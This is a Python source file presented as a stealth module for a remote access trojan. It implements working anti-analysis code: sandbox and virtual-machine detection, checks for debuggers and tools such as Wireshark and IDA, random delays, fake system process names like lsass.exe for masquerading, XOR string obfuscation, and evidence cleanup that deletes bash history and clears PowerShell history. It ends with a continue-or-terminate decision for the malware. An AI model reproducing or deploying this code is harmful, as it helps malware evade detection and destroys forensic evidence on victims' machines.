#!/usr/bin/env python3
"""
STEALTH MODULE FOR RAT - ANTI-DETECTION TECHNIQUES
"""

import platform
import random
import time
import hashlib
import os
import sys
import subprocess

class Stealth:
    def __init__(self):
        self.system = platform.system().lower()
        self.checks_performed = 0
        
    def check_sandbox_environment(self):
        """Check for sandbox/virtual machine indicators"""
        indicators = []
        
        try:
            # Check 1: System uptime (sandboxes often have short uptime)
            if self.system == 'windows':
                uptime_cmd = 'systeminfo | find "System Boot Time"'
                result = subprocess.run(uptime_cmd, shell=True, capture_output=True, text=True)
                if '0:' in result.stdout or '1:' in result.stdout:
                    indicators.append("Short uptime - possible sandbox")
            else:
                with open('/proc/uptime', 'r') as f:
                    uptime_seconds = float(f.readline().split()[0])
                    if uptime_seconds < 3600:  # Less than 1 hour
                        indicators.append("Short uptime - possible sandbox")
            
            # Check 2: RAM size (sandboxes often have limited RAM)
            import psutil
            ram_gb = psutil.virtual_memory().total / (1024**3)
            if ram_gb < 2:  # Less than 2GB
                indicators.append(f"Low RAM ({ram_gb:.1f}GB) - possible sandbox")
            
            # Check 3: CPU cores (limited in VMs)
            cpu_cores = psutil.cpu_count()
            if cpu_cores < 2:  # Single core
                indicators.append(f"Single CPU core - possible VM")
            
            # Check 4: Common sandbox usernames
            suspicious_users = ['sandbox', 'virus', 'malware', 'test', 'user']
            current_user = os.getenv('USERNAME', '').lower() or os.getenv('USER', '').lower()
            if any(user in current_user for user in suspicious_users):
                indicators.append(f"Suspicious username: {current_user}")
            
            # Check 5: Running processes (debuggers, analysis tools)
            analysis_tools = [
                'ollydbg.exe', 'x64_dbg.exe', 'ida64.exe', 'wireshark.exe',
                'procmon.exe', 'processhacker.exe', 'tcpview.exe', 'fiddler.exe',
                'burpsuite.exe', 'charles.exe', 'immunitydebugger.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                if any(tool in proc_name for tool in analysis_tools):
                    indicators.append(f"Analysis tool detected: {proc_name}")
            
            # Check 6: MAC address (VM vendors)
            try:
                import uuid
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                              for ele in range(0,8*6,8)][::-1])
                vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27']
                if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                    indicators.append(f"VM MAC address: {mac}")
            except:
                pass
            
            self.checks_performed = len(indicators)
            return indicators
            
        except Exception as e:
            return [f"Sandbox check error: {str(e)}"]

    def is_likely_sandbox(self, threshold=2):
        """Determine if environment is likely a sandbox"""
        indicators = self.check_sandbox_environment()
        return len(indicators) >= threshold

    def random_delay(self, min_seconds=1, max_seconds=10):
        """Add random delay to avoid pattern detection"""
        delay = random.uniform(min_seconds, max_seconds)
        time.sleep(delay)
        return delay

    def generate_fake_process_name(self):
        """Generate a fake process name for stealth"""
        windows_names = [
            'svchost.exe', 'csrss.exe', 'winlogon.exe', 'services.exe',
            'lsass.exe', 'spoolsv.exe', 'explorer.exe', 'taskhost.exe'
        ]
        
        linux_names = [
            'systemd', 'kworker', 'ksoftirqd', 'migration',
            'rcu_sched', 'watchdog', 'kcompactd', 'systemd-journal'
        ]
        
        if self.system == 'windows':
            return random.choice(windows_names)
        else:
            return random.choice(linux_names)

    def obfuscate_string(self, text):
        """Simple string obfuscation"""
        # Simple XOR obfuscation
        key = 0x42
        obfuscated = ''.join(chr(ord(c) ^ key) for c in text)
        return obfuscated

    def check_debugger(self):
        """Check if process is being debugged"""
        try:
            if self.system == 'windows':
                import ctypes
                return ctypes.windll.kernel32.IsDebuggerPresent()
            else:
                # Linux/Mac method - check TracerPid
                try:
                    with open('/proc/self/status', 'r') as f:
                        for line in f:
                            if line.startswith('TracerPid:'):
                                tracer_pid = int(line.split()[1])
                                return tracer_pid != 0
                except:
                    return False
            return False
        except:
            return False

    def cleanup_evidence(self):
        """Clean up temporary files and evidence"""
        try:
            # Remove temporary Python files
            if hasattr(sys, '_MEIPASS'):
                # PyInstaller temporary directory
                temp_dir = sys._MEIPASS
                # Schedule deletion (would need admin rights)
                pass
            
            # Clear command history
            if self.system == 'windows':
                # Clear PowerShell history
                subprocess.run(['powershell', 'Clear-History'], capture_output=True)
            else:
                # Clear bash history
                history_file = os.path.expanduser('~/.bash_history')
                if os.path.exists(history_file):
                    os.remove(history_file)
            
            return "Evidence cleanup attempted"
        except Exception as e:
            return f"Cleanup error: {str(e)}"

    def get_stealth_report(self):
        """Generate comprehensive stealth report"""
        report = {
            'system': self.system,
            'sandbox_checks_performed': self.checks_performed,
            'sandbox_indicators': self.check_sandbox_environment(),
            'likely_sandbox': self.is_likely_sandbox(),
            'debugger_detected': self.check_debugger(),
            'suggested_process_name': self.generate_fake_process_name(),
            'recommended_action': 'CONTINUE' if not self.is_likely_sandbox(3) else 'TERMINATE'
        }
        
        return report

# Example usage
if __name__ == "__main__":
    stealth = Stealth()
    
    print("🔍 Stealth Module Test")
    print("=" * 50)
    
    # Perform checks
    report = stealth.get_stealth_report()
    
    print(f"System: {report['system']}")
    print(f"Sandbox Indicators: {len(report['sandbox_indicators'])}")
    for indicator in report['sandbox_indicators']:
        print(f"  ⚠️  {indicator}")
    
    print(f"Debugger Detected: {report['debugger_detected']}")
    print(f"Recommended Action: {report['recommended_action']}")
    
    # Test random delay
    delay = stealth.random_delay(1, 3)
    print(f"Random Delay: {delay:.2f} seconds")